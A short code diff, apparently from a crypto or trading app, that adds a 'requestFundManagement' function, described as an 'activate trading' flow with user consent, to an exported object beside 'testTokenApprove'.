-    testTokenApprove
+    testTokenApprove,
+    requestFundManagement, // real "activate trading" flow with user consent
   };
 };
